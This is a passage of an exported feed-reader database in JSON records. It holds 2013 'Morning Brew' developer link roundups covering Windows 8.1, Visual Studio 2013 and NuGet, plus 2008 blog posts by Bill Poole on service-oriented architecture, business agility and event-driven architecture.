button, login to desktop, the inclusion of Outlook RT (for Surface RT users), and a whole host of other improvements.</li><li><a href=\"http://www.hanselman.com/blog/10NewFeaturesInWindows81PreviewThatSavedMySurfaceRT.aspx\">10 New Features in Windows 8.1 Preview that saved my Surface RT</a> - Scott Hanselman takes a look at his top 10 new features included in the Windows 8.1 Update</li><li><a href=\"http://blogs.msdn.com/b/robmar/archive/2013/06/26/windows-8-1-preview-frequently-asked-questions-faq.aspx\">Windows 8.1 Preview : Frequently Asked Questions (FAQ)</a> - Rob Margel highlights the offical Windows 8.1 FAQ which provides answers to the most common questions about the use of the Preview release.</li><li><a href=\"http://blogs.msdn.com/b/ie/archive/2013/06/26/introducing-ie11-the-best-way-to-experience-the-web-on-modern-touch-devices.aspx\">Introducing IE11: The Best Way to Experience the Web on Modern Touch Devices</a> - The Internet Explorer Team announce the release of Internet Explorer 11 Preview  included as a part of the Windows 8.1 Update Preview release.  This release includes numerous performance improvements, and significantly a completely new set of F12 Developer Tools</li><li><a href=\"http://blogs.msdn.com/b/officeapps/archive/2013/06/26/office-developer-tools-for-visual-studio-2013-preview-released.aspx\">Office Developer Tools for Visual Studio 2013 Preview released!</a> - Xiaoying Guo highlights the release of the Office Developer Tools for Visual Studio 2013 preview, allowing you to continue developing office solutions when moving to Visual Studio 2013</li><li><a href=\"http://blogs.msdn.com/b/bingdevcenter/archive/2013/06/26/bing-developers-build.aspx\">Introducing The New Bing Developer Center and Services</a> - The Bing Developer Center also announced a number of new features for Windows 8 developers at //Build, with OCR (Optical Character Recognition) Services, Text to Speech, new Translation controls and improvements to mapping</li></ul><h3>Software</h3><ul><li><a href=\"http://blog.nuget.org/20130626/nuget-2.6-released.html\">NuGet 2.6 Released and Included in Visual Studio 2013 Preview</a> - The NuGet Team announce the release of NuGet 2.6, and its inclusion in the box for the Visual Studio 2013 Preview release.  As well as VS2013 compatibility this release includes the integration with the XDT transform engine for better configuration transformation, machine wide configuration, improved contextual search and better statistics tracking for packages, including breaking down direct installs and dependency installs.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/06/26/asp-net-updates-to-support-windows-azure-active-directory.aspx\">ASP.NET updates to support Windows Azure Active Directory - </a> - Sayed-Ibrahim-Hashimi highlights an update to the Visual Studio 2013 preview which adds ASP.NET support for the Windows Azure Active Directory within its authentication controls/libraries.</li></ul><h3>Information</h3><ul><li><a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/advanced-unit-testing-techniques-in-javascript/\">Advanced Unit Testing Techniques in JavaScript</a> - Guido Kessels takes a look at the use of SinonJS and BusterJS to provide mocking, stubbing and testing capabilities to enable you to test JavaScript code in depth</li><li><a href=\"http://designcoderelease.blogspot.co.uk/2013/06/spa-authentication-in-net-world.html\">SPA Authentication in a .Net world</a> - Nathan Gloyn takes a look at Single Page Application Development, and specifically at the authentication options available for use in such applications</li><li><a href=\"http://magnusmartensson.com/quickly-swap-windows-azure-web-site-version-in-the-portal-with-zero-downtime\">Quickly swap Windows Azure Web Site version in the Portal with zero downtime</a> - Magnus Mårtensson has shared a series of short videos looking at the various aspects of deployment of Windows Azure Websites, including using the different Version Control based deployment options.  Check out the links in this post to the other videos in the series.</li><li><a href=\"http://www.daedtech.com/please-dont-recycle-local-variables\">Please Don’t Recycle Local Variables</a> - Erik Dietrich discusses the benefits of recycling in the real world, but urges you to not recycle variables in your code, helping you to move away from the bad old days of procedural code, and to help refactoring tools to operate correctly by not inter-relating unrelated concepts by sharing variables.</li><li><a href=\"http://geekswithblogs.net/TarunArora/archive/2013/06/27/upgrading-vsix-extensions-from-vs2012-to-vs2013.aspx\">Upgrading VSIX extensions from VS2012 to VS2013<br /></a> - Tarun Arora takes a look at the process to upgrade Visual Studio Extensions Projects to target Visual Studio 2013</li></ul><h3>Community</h3><ul><li><a href=\"https://www.innerworkings.com/promotions/09e866f5-af0e-407d-a036-030ce6af435a/lidnug-global-coding-contest\">LIDNUG Global Coding Contest</a> - InnerWorkings and LIDNUG have teamed up to run the LIDNUG Global Coding Contest, a challenge where you solve a variety of coding challenges using Visual Studio 2012 and Windows 8, and can win great prizes from a variety of .NET Tools vendors.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/-HQNJ9eaYDk\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1243}}
{"k":"0000000084","o":"0000002448","v":"001"}
{"_id":1244,"_uid":1244,"_dt":1373742620969,"_s":"456787265395ff91dae127017c03f1ec"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/TlKQIdtEfvc/","title":"The Morning Brew #1383","published":{"$wrap":"$date","v":1372062818000,"h":"2013-06-24T08:33:38.000Z"},"starred":false,"read":false,"content":"<p>Short Edition today, mostly due to bad traffic on my commute….</p><h3>Software</h3><ul><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/a-sweet-summer-sysinternals-suite.html\">A Sweet Summer Sysinternals Suite Refresh</a> - Greg Duncan highlights the latest refresh of the whole SysInternals Suite of debugging and diagnostic tools - if these aren’t already in your toolset, they really should be</li></ul><h3>Information</h3><ul><li><a href=\"http://www.syncfusion.com/resources/techportal/ebooks/typescript\">TypeScript Succinctly</a> - Syncfusion have released another of the free (registration required) e-books in their Succinctly series.  This title from Steve Fenton takes a look at the TypeScript langauge</li><li><a href=\"http://msmvps.com/blogs/jon_skeet/archive/2013/06/22/array-covariance-not-just-ugly-but-slow-too.aspx\">Array covariance: not just ugly, but slow too</a> - Jon Skeet takes a look at array covariance, and shows how this is one area where the cleaner code options performs better than the more complex covariance.</li><li><a href=\"http://harriyott.com/2013/06/managing-the-development-process\">Managing the development process</a> - Simon Harriyott discusses his software development process, and how he manages his single developer / self developer projects for his clients.</li><li><a href=\"http://www.codeproject.com/Articles/610566/Understanding-Thread-s-Synchronization-Objects-wit\">Understanding Thread’s Synchronization Objects with a Real Life Example</a> - Priyank Purwar takes a dive into the various synchronisation types there are available in most programming lanauges, looking at their use and illustrating with exmaples.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.udidahan.com/2013/06/21/the-ask-udi-podcast-is-back/\">The \"Ask Udi\" podcast is back</a> - Udi Dahan is resuming his ‘Ask Udi’ podcast series, and has resurrected the old episodes he is able to locate, and is looking for questions for future shows.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/TlKQIdtEfvc\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1244}}
{"k":"0000000084","o":"0000004178","v":"001"}
{"_id":1245,"_uid":1245,"_dt":1373742620969,"_s":"b1c86cf1ebbfc12c42ad87c2f19d0cdd"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/oegTGIcNaC8/","title":"The Morning Brew #1390","published":{"$wrap":"$date","v":1372840626000,"h":"2013-07-03T08:37:06.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://www.hanselman.com/blog/OneOfMicrosoftsBestKeptSecretsPythonToolsForVisualStudioPTVS.aspx\">One of Microsoft’s Best-Kept Secrets - Python Tools for Visual Studio (PTVS)</a> - Scott Hanselman highlights the oft forgotten (by MS developers) language Python and the rather excellent Python Tools For Visual Studio which gives a nice IDE experience for developing Python.</li><li><a href=\"http://blogs.jetbrains.com/dotnet/2013/07/code-completion-improvements-in-resharper-8/\">Code Completion Improvements in ReSharper 8</a> - Dmitri Nesteruk shares more details of the Code Completion features of ReSharper 8, showing how the different improvements to code completion behave in use</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/kristol/archive/2013/07/02/the-git-command-line-101-for-windows-users.aspx\">The Git Command Line 101 for Windows Users</a> -  Kristofer Liljeblad  shares a really nice introductory guide to the use of Git on Windows, looking at getting it installed (using the very cool Chocolatey), and explores some of the common queries and questions of its use.</li><li><a href=\"http://www.codeproject.com/Articles/614507/Modular-Javascript-Using-Require-Js\">Modular Javascript Using Require.Js</a> - Sacha Barber takes a look at the use of Require.js to create modular JavaScript code, looking at the motivation for the use of Require and exploring its use via an example in this CodeProject article</li><li><a href=\"http://blogs.microsoft.co.il/blogs/sasha/archive/2013/07/02/visual-studio-2013-heap-view.aspx\">Visual Studio 2013 Heap View</a> - Sasha Goldshtein continues exploring some of the new debugging features of Visual Studio 2013 taking a look at the heap viewer, showing how it can be used to debug memory related issues in your applications.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/07/02/manage-cors-policy-dynamically.aspx\">Manage CORS policy dynamically</a> - Xueyuan Dai takes a look at how you can control the Cross Origin Request Sharing (CORS) policy in your ASP.NET Web API projects with soring the allowed hosts in either a configuration file or database.</li><li><a href=\"http://blogs.msdn.com/b/agile/archive/2013/07/02/windows-azure-autoscaling-now-built-in.aspx\">Windows Azure autoscaling now built-in</a> - Grigori Melnik discusses the new Windows  Azure AutoScaling features released last week, and compares the features of the built in offering to those offered by Wasabi</li><li><a href=\"http://blogs.msdn.com/b/cjacks/archive/2013/07/02/troubleshooting-and-fixing-session-cookie-problems-in-ie11.aspx\">Troubleshooting and Fixing Session Cookie Problems in IE11</a> - Chris Jackson highlights potential problems with Session Cookies in ASP.NET Applications when visited using Internet Explorer 11</li><li><a href=\"http://www.codeproject.com/Articles/614769/Rock-Solid-Quality\">Rock Solid Quality</a> - Paulo Zemek shares thoughts on creating quality in your code by having components be ‘Rock Solid Quality’, bu adopting encapsulation, immutability and a number of other approaches to help eradicate the places where bugs lurk.</li></ul><h3>Community</h3><ul><li><a href=\"https://www.simple-talk.com/blogs/2013/07/02/25-secrets-for-faster-asp-net-the-eagle-has-landed/\">25 Secrets for Faster ASP.NET: the Eagle has landed!<br /></a> - Michaela Murray highlights the availability of the latest e-Book from Red Gate containing 25 community sourced tips and tricks for faster ASP.NET Applications.  The e-book is a free download (though you will have to give your email) and is well worth checking out.  Michaela also announces the winner of the competition for best tip in this post.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/oegTGIcNaC8\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1245}}
{"k":"0000000084","o":"0000003176","v":"001"}
{"_id":1246,"_uid":1246,"_dt":1373742620970,"_s":"6c33918862136e4fba7bfaa9d2554cf8"}
{"subscription":{"$wrap":"$oid","v":56},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/hPCIFcqZEIE/","title":"The Morning Brew #1379","published":{"$wrap":"$date","v":1371544477000,"h":"2013-06-18T08:34:37.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/log-parser-studio-20-now-out-log-parser.html\">Log Parser Studio 2.0 now out (Log Parser GUI++)</a> - Greg Duncan highlights the latest release of LogParser Studio, a GUI environment for working with the LogParser 2.2 which allows you to issue SQL like queries against a wide range of log file formats.</li></ul><h3>Information</h3><ul><li><a href=\"http://ericlippert.com/2013/06/17/string-concatenation-behind-the-scenes-part-one/\">String concatenation behind the scenes, part one</a> - Eric Lippert kicks off a new series of posts looking the art and science of string concatenation, looking at some of the optimisations he worked on that got included in the C# compiler.</li><li><a href=\"http://www.daedtech.com/dont-write-code-you-dont-need\">Don’t Write Code You Don’t Need</a> - Erik Dietrich shares some sage advice about writing too much code and exposing too much of your code to the consumers of that code, along with the perils of Mutability.</li><li><a href=\"http://haacked.com/archive/2013/06/17/hidden-code-mines.aspx\">Hidden Code Mines</a> - Phil Haack discusses a concept he is calling code mines, those bits of innocuous code which would get skipped over in a code review, but actually contain some subtle bug which will explode when you least expect.</li><li><a href=\"http://elegantcode.com/2013/06/17/3-pillars-of-pragmatic-agility/\">3 Pillars of Pragmatic Agility</a> - David Starr highlights his latest article for Visual Studio Magazine which proposes a new standard for agile software development which builds on the work of the last 12 years of being agile in a variety of forms.</li><li><a href=\"http://weblogs.asp.net/rchartier/archive/2013/06/16/agent-the-world-s-smartest-watch.aspx\">AGENT: The World’s Smartest Watch</a> - Rob Chartier takes a look at AGENT, the smart watch which is based upon the .NET Micro Framework with an API allowing .NET developer to leverage the power of a small write mounted device.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.eventbrite.co.uk/event/6625136963/eorg#\">DareDevs: TDD, where did it all go wrong</a> - DareDevs (formerly Manchester / Warrington NxtGenUG) welcome Ian Cooper for a session on TDD, and how it has evolved since the original TDD rules,  this Wednesday evening (19 June)</li><li><a href=\"http://www.craftycoders.net/Events\">Events | CraftyCoders</a> - The Crafy Coders (Bromsgrove) have a sessions from Dan Kendall, Neil Barnwell and Jay McGuiness/James Morcom on Thursday 20th June 2013 where they will all be exploring Builds and Deployment.  Crafty Coders are also running a whole day (Saturday) Code Retreat on Saturday 31st August.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/hPCIFcqZEIE\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1246}}
{"k":"0000000084","o":"0000006075","v":"001"}
{"_id":1247,"_uid":1247,"_dt":1373742620970,"_s":"44bf082bfdf548d175e30877da8549f6"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/WaVr7-qjpt8/anatomy-of-service-part-ii.html","title":"The Anatomy of a Service (Part II)","published":{"$wrap":"$date","v":1224517740004,"h":"2008-10-20T15:49:00.004Z"},"starred":false,"read":false,"content":"With my<a href=\"http://bill-poole.blogspot.com/2008/10/anatomy-of-service-part-i.html\">last post</a>, we began the journey into the anatomy of a service by restating the definition of a service in the context of SOA.  In this post, we're going to dig a bit deeper into the elements that make up a service.  These elements are illustrated below.<br /><br /><a href=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s1600-h/Service+Elements.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s400/Service+Elements.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5259264051338904338\" /></a><br />Note that the illustration above doesn't imply any kind of layering.  There are three types of service elements depicted.  The yellow elements are related to the service domain.  This is the logic, information model and state that drives the behaviour of the service relative to the responsibilities it holds in the overall architecture.<br /><br />The green elements relate to the service boundary.  The service contract describes the messages managed by the service and the endpoints through which the messages are exchanged.<br /><br />The blue elements are service resources.  Note that the service contains human resources.  This is because service logic may in part be executed by people.  This is explained in more detail<a href=\"http://bill-poole.blogspot.com/2008/03/are-there-people-in-my-service.html\">here</a>.  This is a very important point.  Most discussions around SOA tend to describe services only as IT constructs.  A service consumer is unaware and does not care whether the service functionality is provided by people at a keyboard or software running on a server.<br /><br />In addition to the human resources, a service also will very likely contain software and hardware infrastructure.  The hardware infrastructure refers to the physical hardware on which the service operates - e.g. servers, SANs and communication infrastructure.<br /><br />The software infrastructure refers to software that supports the operation of the service, but doesn't implement the logic defined within the service domain.  So for example, this software would include operating systems, application platforms and communication software.<br /><br />The distinction between software infrastructure and service domain logic is an important one.  Software infrastructure can be reused between services, whereas logic related to the service domain should not be.  Domain logic should be implemented and deployed only once in one service.  Why?  Because otherwise we have low cohesion - a single concern addressed by multiple services - and that leads to coupling between services.<br /><br />So why can we reuse software infrastructure between services?  This is because such software is generic.  It doesn't pertain to any specific service domain.  Take UI rendering logic for instance.  The logic required for rendering a window doesn't relate to any specific domain addressed by any service in your business.<br /><br />Other examples of software infrastructure include rules engines and workflow systems.  However the rules and workflows themselves<i>would</i>constitute service domain logic.<br /><br />An interesting example is a CRM package.  A CRM package comes with quite a lot of what would seem to be domain logic.  For example, a CRM may be deployed in support of the Sales function of a business without a great deal of customisation.  Here, a large number of the native application features will directly contribute to the service domain.<br /><br />A CRM package does not however need to deal only with customers.  Most CRM packages can be highly customised to hold custom entities with complex relationships.  Custom logic can be added to the CRM package to implement specific business rules around these entities.  In this case the CRM package is being leveraged as an application platform, and as such is not implementing the domain logic of the service.<br /><br />Okay last but not least, we need to discuss the service information model and state.  Pretty much every service will have state.  That state will conform to the service information model and the service domain logic executes against that information model.  To that end, the service information model, state and domain logic are all indelibly linked.<br /><br />Note that any state leveraged by the software infrastructure is considered part of the infrastructure itself and not part of the service state in the above illustration.<br /><br />Just like service domain logic, the service state and information model should not be shared between services as it introduces coupling.  Services should share data only by way of message exchange, although this is not always possible when transforming an enterprise full of legacy applications to an SOA - at least initially; but more on that in a future post.<br /><br />So everything in blue in the above illustration is reusable between services.  The same people can participate in many services, and the same software and hardware infrastructure is reusable between services.  Everything else should not be directly reused as it introduces coupling and reduces cohesion.  Of course, domain logic within one service can be reused by other services through exchanging messages with that service.<br /><br />Okay well that sums up the basic elements of a service.  Stay tuned for my next post in this series!<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/WaVr7-qjpt8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1247}}
{"k":"0000000084","o":"0000003627","v":"001"}
{"_id":1248,"_uid":1248,"_dt":1373742620970,"_s":"160850f89a2a50af02425151721609f7"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/HFWv5ergm4U/anatomy-of-service-part-i.html","title":"The Anatomy of a Service (Part I)","published":{"$wrap":"$date","v":1224170340002,"h":"2008-10-16T15:19:00.002Z"},"starred":false,"read":false,"content":"It occurred to me that to date I've been heavily focussed on defining SOA, techniques for defining service boundaries, contracts and responsibilities, and the various flavours of SOA that we see in the wild, without giving much attention to what goes on<i>inside</i>the service boundary.  So I thought it appropriate to begin a series of blog posts on the anatomy of a service.<br /><br />So let us begin by restating the definition of a service.  A service (in the context of SOA) is an autonomous coarse grained unit of logic that exposes functionality by way of exchanging messages conforming to its service contract with service consumers via its endpoints.<br /><br />The service contract describes the syntax (not semantics) of messages exchanged via each service endpoint, as well as the means by which messages are carried between each endpoint and service consumers.  Each endpoint is located and uniquely identified by its address.<br /><br />A service provider may also consume other services, and a service consumer may in fact also be a service provider.  As such, the terms<i>service provider</i>and<i>service consumer</i>describe roles in a specific interaction.  The rules governing communication with a service are described by its policy.<br /><br />What do we mean when we say a service is autonomous?  Well we mean a few things actually.  Firstly, services are in control of their own state.  Services are not<i>instantiated</i>by their consumers.  A service exists as a single autonomous entity.<br /><br />Secondly, we mean that services may be under different ownership domains.  Those parties responsible for the service and its management may very likely be different to those responsible for other services.  Services may be versioned and deployed independently of each other.<br /><br />And thirdly, we mean that services should not be dependent upon the availability of other services in order to function without failure - even if that is in some limited capacity.<br /><br />I'd also like to point out that there is the view that a service contract should<i>not</i>be devoid of semantic definition.  There is the thinking that a service contract should also describe the semantics of the messages exchanged by the service, as well as the state the expected behaviour of the service.<br /><br />Okay so now we've defined a service, what does a service look like?  Well that's the beauty of SOA - because service implementations are encapsulated within their service boundaries, consumers don't (or shouldn't anyway) have any visibility or knowledge of the service provider's implementation.<br /><br />But that doesn't really help us much as architects that need to design these things.  That's the reason for this series of blog posts.  We as architects need to understand the different ways to go about designing services - not just their boundaries and responsibilities, but their implementations as well.<br /><br />Over the next few posts I intend to go through various different flavours of service anatomy in order to bring some clarity to the various options that exist for implementing services.  So stay tuned!<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/HFWv5ergm4U\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1248}}
{"k":"0000000084","o":"0000004017","v":"001"}
{"_id":1249,"_uid":1249,"_dt":1373742620970,"_s":"694a7c156491511790439c14018f414b"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/inAj9YuVHoA/soa-eda-and-mpinet.html","title":"SOA, EDA and MPI.NET","published":{"$wrap":"$date","v":1222876260004,"h":"2008-10-01T15:51:00.004Z"},"starred":false,"read":false,"content":"I had another good<a href=\"https://www.blogger.com/comment.g?blogID=4338956765494283322&postID=7619190459401503391\">question</a>from Miguel, this time referring to my post on<a href=\"http://bill-poole.blogspot.com/2008/09/soa-and-eda.html\">SOA and EDA</a>where he asked whether distributed systems built using<a href=\"http://www.osl.iu.edu/research/mpi.net/\">MPI.NET</a>conform to the SOA or EDA style of architecture.<br /><br />MPI.NET is a platform for building a single distributed application where different parts of the application run on different nodes within a cluster of machines.  Often, the same program runs on different nodes, but takes on different roles on each node.  The role each program instance takes on each node can be determined by a unique rank assigned by the MPI environment to each MPI process.<br /><br />Messages can then be passed between different processes to coordinate their activities.  Often the program detects if it is rank zero and if so takes on the \"root\" responsibility, handing data and control messages to the other nodes, coordinating their activities and aggregating their results.<br /><br />The message exchange patterns offered by MPI.NET are<i>point-to-point</i>,<i>all-to-one</i>(gathering data),<i>one-to-all</i>(broadcast) and<i>all-to-all</i>.  These message exchange patterns differ from the message exchange pattern inherent to EDA, publish-subscribe.<br /><br />With publish-subscribe, systems subscribe to specific topics or topic specifications.  Messages published onto a given topic are routed to all subscribers that have subscribed to a matching topic specification.  Alternatively, subscriptions may be defined based on message content-based rules.<br /><br />With MPI.NET, there are no subscriptions as such.  Messages may be<i>broadcasted</i>to every node, which then decides whether the message is relevant.  This is a subtle difference, and perhaps one might argue it represents a highly simplified form of EDA.<br /><br />With regards to SOA, it is extremely bad practice for services to share the same business rules or data representation as it couples services too tightly.  The fundamental principle of MPI.NET is that the same logic can/will run on multiple nodes.  The purpose is quite different from SOA.<br /><br />With MPI.NET, you are distributing execution of the same logic across multiple servers for the purpose of increasing performance.  With SOA each service is responsible for its own logic, encapsulated behind its service boundary.<br /><br />Furthermore, the number of nodes allocated in an MPI.NET application is dynamic by design.  With SOA, each service has specific rules and responsibilities.  The number of services cannot be dynamically increased or decreased.<br /><br />Certainly<i>within</i>a service the number of nodes allocated to handle messages could be dynamically adjusted based on load.  However, these nodes are not directly addressable.  They are not visible to the consumers of the service.<br /><br />Another difference is that MPI.NET nodes do not have the concept of endpoints.  One cannot deliver messages to an MPI.NET node across a variety of different bindings via different endpoints.<br /><br />MPI.NET should be seen as a way to implementing a single service internally across multiple machines for the purpose of improving performance.<br /><br />I would say therefore that MPI.NET is not a platform for implementing SOA.  It could be considered as supporting the EDA style of architecture, but only in a very simplistic sense.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/inAj9YuVHoA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1249}}
{"k":"0000000084","o":"0000005916","v":"001"}
{"_id":1250,"_uid":1250,"_dt":1373742620971,"_s":"8593c2d556171f5c227f4b2b3ac6b9bd"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/NTVjotOGZA8/business-agility.html","title":"Business Agility","published":{"$wrap":"$date","v":1222592160002,"h":"2008-09-28T08:56:00.002Z"},"starred":false,"read":false,"content":"Business agility (along with<a href=\"http://bill-poole.blogspot.com/2008/08/business-it-alignment.html\">business-IT alignment</a>) is often touted as one of the key benefits of SOA.  The problem is that more often than not no explanation is given for what business agility actually<i>is</i>, why it is important, or how SOA contributes to achieving it.<br /><br />Firstly, it is important to note that business agility is a relative goal as opposed to an absolute one.  Even the most agile business can strive for greater agility.<br /><br />So what is business agility?  Business agility is the degree to which an organisation can effectively innovate and respond to market forces.<br /><br />In any given undertaking within an organisation, there are the traditional project management constraints of time, resource, scope and quality.  For a fixed scope if we wish to decrease time to delivery, we must increase resource or decrease quality.  For fixed resource if we wish to decrease time to delivery, we must decrease scope or quality.<br /><br />Note that scope refers to the amount of work that needs to be done to deliver the agreed outcome.  But as always, there is more than one way to skin a cat.  The business objectives targeted by the project can be met in any number of different ways.  A talented Solution Architect can design a solution to a business problem that requires less work to deliver.<br /><br />Really what we are talking about here is contrasting<i>business value</i>with<i>effort</i>.  If an organisation has a highly complex IT architecture that is very tightly coupled with a large number of interdependencies, then a change will take more<i>effort</i>to achieve, but deliver the same<i>business value</i>.<br /><br />In order to have an agile organisation, we must have the ability to enact change with less effort.  SOA helps simplify the IT architecture of an organisation by making systems more loosely coupled.  Of course, there are varying degrees of loose coupling with different SOA implementations.<br /><br />The SOA architectural style reduces coupling through message based interactions conforming to explicitly defined service contracts that encapsulate the implementation details of services away from consumers.  This gives us the ability to make changes to service implementations without impacting their consumers.<br /><br />We reduce coupling further by designing our services with appropriate<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">granularity and cohesion</a>, based on publish-subscribe messaging with<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">stable service contracts</a>.<br /><br />The IT architecture of an organisation however is only one piece of the business agility puzzle.  Once a business need has been identified, the business requirements must be extracted.  The speed, efficiency and accuracy with which this activity is performed also contribute to business agility.  There is very little business value in delivering a solution that doesn't meet the identified business objectives.<br /><br />Furthermore once we have extracted our business requirements, assuming they are accurate, we need to produce a solution architecture that meets those requirements.  So an organisation's proficiency in Solution Architecture is also significant here.<br /><br />We also want to ensure that as each solution is delivered, the complexity of the business and IT architecture is not adversely affected.  As such, we need the proper architecture governance processes in place to protect the broader enterprise architecture.<br /><br />It is important to strike the right balance with governance however.  Inefficient governance processes slow the rate at which projects can be delivered, thus harming business agility.  Insufficient governance however will result in the gradual increase of architectural complexity, thus harming business agility in the long run.<br /><br />Simply developing an effective solution architecture is still not enough.  We must of course then go about implementing the solution.  Here, the effectiveness of the organisation's project and programme management function is relevant, as well as the proficiency of the people that build and deploy the solution.<br /><br />And finally once the solution is ready to deploy, there must be effective change management processes in place to ensure that affected workers are properly trained and informed to support the change.  If the solution is not embraced by the people it affects, then the change will be ineffective.<br /><br />So why all the fuss about business agility?  Simply put, an organisation that doesn't respond to its changing environment will eventually become uncompetitive.  Granted that some industries are more volatile than others, however all business environments change over time.  Those businesses that are able to embrace this change in order to generate competitive advantage will be more successful.<br /><br />Innovation is also a key consideration in generating competitive advantage.  The ability to be able to take an idea and turn it into reality in less time, with less cost and lower risk certainly generates competitive advantage.<br /><br />So in conclusion, SOA as a style of architecture<i>contributes</i>towards business agility through reduction of enterprise architectural complexity, but by no means guarantees it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/NTVjotOGZA8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1250}}
{"k":"0000000084","o":"0000002744","v":"001"}
{"_id":1251,"_uid":1251,"_dt":1373742620971,"_s":"51e494730049de864f6ce56e9951d9aa"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/l7DD_fs6EkA/soa-and-eda.html","title":"SOA and EDA","published":{"$wrap":"$date","v":1222419120002,"h":"2008-09-26T08:52:00.002Z"},"starred":false,"read":false,"content":"So far I've posted a large amount of material on SOA, pushing very heavily for an event driven approach - with specific attention to<i>business services</i>, where business-relevant events are surfaced as event messages published over a service bus.<br /><br />There has been an ongoing discussion in the public forum around the relationship between SOA and EDA (Event Driven Architecture). Are they in fact separate architectural styles?  Are they separate concerns?  Do they complement each other?  Does SOA subsume EDA?<br /><br />SOA and EDA are in fact separate architectural styles.  However they describe different concerns of an architecture.  They each bring their own benefits.  As such, it is possible (and in fact good practice) for the two styles to overlap.  An architecture can indeed both be service oriented<i>and</i>event driven.  Likewise it is possible for an architecture to be service oriented but not event driven, or event driven and not service oriented.  This is illustrated below.<br /><br /><a href=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s1600-h/SOA+and+EDA.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s400/SOA+and+EDA.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5250250730517127730\" /></a><br />An architecture consisting of services with no endpoints with a publish-subscribe binding conforms to the service oriented style of architecture, but is not event driven.  An architecture consisting of messages published over topics, but where there is no notion of services is event driven, but not service oriented.  For example, EAI can be achieved by having a number of applications publishing and subscribing over a set of topics, without explicitly defining any services, endpoints or service contracts.<br /><br />Where SOA and EDA come together, a topic corresponds to a specific endpoint of a specific service.  A topic cannot be shared between endpoints or services, and messages published onto a topic must conform to an explicitly defined service contract.  SOA brings benefits to EDA and vice versa.  Therefore we get the best result when the two architectural styles are combined.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/l7DD_fs6EkA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1251}}
{"k":"0000000084","o":"0000000893","v":"001"}
{"_id":1252,"_uid":1252,"_dt":1373742620971,"_s":"1fbc6cb59932fa894d417f41ecd8d252"}
